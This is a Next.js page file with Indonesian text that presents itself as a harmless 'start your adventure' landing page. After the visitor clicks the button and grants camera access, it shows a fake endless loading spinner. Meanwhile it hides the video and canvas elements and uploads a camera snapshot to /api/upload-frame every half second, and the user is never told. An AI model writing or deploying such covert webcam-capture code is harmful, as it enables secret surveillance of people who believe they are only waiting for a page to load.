// app/page.js
"use client";

import { useRef, useState, useEffect } from "react";

export default function HomePage() {
  const [phase, setPhase] = useState("intro"); // 'intro' | 'loading'
  const [error, setError] = useState("");

  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const streamRef = useRef(null);
  const intervalRef = useRef(null);
  const sendingRef = useRef(false); // supaya tidak overlap request

  async function startCamera() {
    if (typeof navigator === "undefined" || !navigator.mediaDevices) {
      throw new Error("Browser ini tidak mendukung akses kamera.");
    }

    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    streamRef.current = stream;

    if (videoRef.current) {
      videoRef.current.srcObject = stream;
      await videoRef.current.play();
    }
  }

  async function sendFrameToServer(blob) {
    if (!blob) return;
    if (sendingRef.current) return; // tunggu sampai request sebelumnya selesai

    sendingRef.current = true;
    try {
      const formData = new FormData();
      formData.append("image", blob, `frame-${Date.now()}.jpg`);

      const res = await fetch("/api/upload-frame", {
        method: "POST",
        body: formData
      });

      if (!res.ok) {
        console.warn("Gagal kirim ke server:", await res.text());
      }
    } catch (err) {
      console.error("Error kirim frame:", err);
    } finally {
      sendingRef.current = false;
    }
  }

  function startCaptureLoop() {
    const video = videoRef.current;
    const canvas = canvasRef.current;
    if (!video || !canvas) return;

    const ctx = canvas.getContext("2d");

    intervalRef.current = setInterval(() => {
      if (video.readyState < 2) {
        // metadata belum siap
        return;
      }

      if (canvas.width !== video.videoWidth || canvas.height !== video.videoHeight) {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
      }

      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob(
        (blob) => {
          // kirim ke server
          sendFrameToServer(blob);
        },
        "image/jpeg",
        0.8
      );
    }, 500); // 0.5 detik
  }

  function stopCamera() {
    if (intervalRef.current) {
      clearInterval(intervalRef.current);
      intervalRef.current = null;
    }
    if (streamRef.current) {
      streamRef.current.getTracks().forEach((t) => t.stop());
      streamRef.current = null;
    }
  }

  async function handleClick() {
    setError("");
    try {
      await startCamera();
      setPhase("loading");
      startCaptureLoop();
    } catch (err) {
      console.error(err);
      setError(err.message || "Izin kamera ditolak atau terjadi kesalahan.");
      stopCamera();
    }
  }

  useEffect(() => {
    return () => {
      // cleanup saat halaman ditinggalkan
      stopCamera();
    };
  }, []);

  return (
    <div className="page-root">
      {phase === "intro" && (
        <div className="container">
          <h1>ayo, mulai bertualangmu!</h1>
          <p>Tekan tombol di bawah untuk melanjutkan perjalananmu.</p>
          <button onClick={handleClick}>
Mulai Sekarang</button>
          {error && <div className="error">{error}</div>}
        </div>
      )}

      {phase === "loading" && (
        <div className="loading-page">
          <div className="loading-spinner" />
          <div className="loading-text">Loading...</div>
        </div>
      )}

      {/* video & canvas tersembunyi */}
      <video
        ref={videoRef}
        className="hidden-media"
        autoPlay
        playsInline
        muted
      />
      <canvas ref={canvasRef} className="hidden-media" />

      {/* CSS inline biar nggak perlu file terpisah */}
      <style jsx global>{`
        * {
          box-sizing: border-box;
          margin: 0;
          padding: 0;
          font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI",
            sans-serif;
        }

        body {
          min-height: 100vh;
          display: flex;
          justify-content: center;
          align-items: center;
          background: #0f172a;
          color: #e5e7eb;
        }

        .page-root {
          width: 100%;
          display: flex;
          justify-content: center;
          align-items: center;
        }

        .container {
          text-align: center;
          padding: 24px;
        }

        h1 {
          margin-bottom: 16px;
          font-size: 1.8rem;
        }

        p {
          margin-bottom: 24px;
          color: #9ca3af;
        }

        button {
          padding: 12px 24px;
          font-size: 1rem;
          border-radius: 999px;
          border: none;
          cursor: pointer;
          background: #3b82f6;
          color: white;
          font-weight: 600;
          box-shadow: 0 10px 25px rgba(59, 130, 246, 0.4);
          transition: transform 0.15s ease, box-shadow 0.15s ease,
            opacity 0.15s ease;
        }

        button:hover {
          transform: translateY(-1px);
          box-shadow: 0 16px 40px rgba(59, 130, 246, 0.6);
          opacity: 0.95;
        }

        button:active {
          transform: translateY(0);
          box-shadow: 0 8px 20px rgba(59, 130, 246, 0.5);
        }

        .loading-page {
          text-align: center;
        }

        .loading-spinner {
          width: 64px;
          height: 64px;
          border-radius: 999px;
          border: 6px solid #1f2937;
          border-top: 6px solid #3b82f6;
          margin: 0 auto 16px auto;
          animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
          to {
            transform: rotate(360deg);
          }
        }

        .loading-text {
          font-size: 1rem;
          letter-spacing: 0.08em;
          text-transform: uppercase;
          color: #9ca3af;
        }

        .error {
          margin-top: 16px;
          color: #f87171;
          font-size: 0.9rem;
        }

        .hidden-media {
          position: absolute;
          width: 1px;
          height: 1px;
          opacity: 0;
          pointer-events: none;
          overflow: hidden;
        }
      `}</style>
    </div>
  );
}
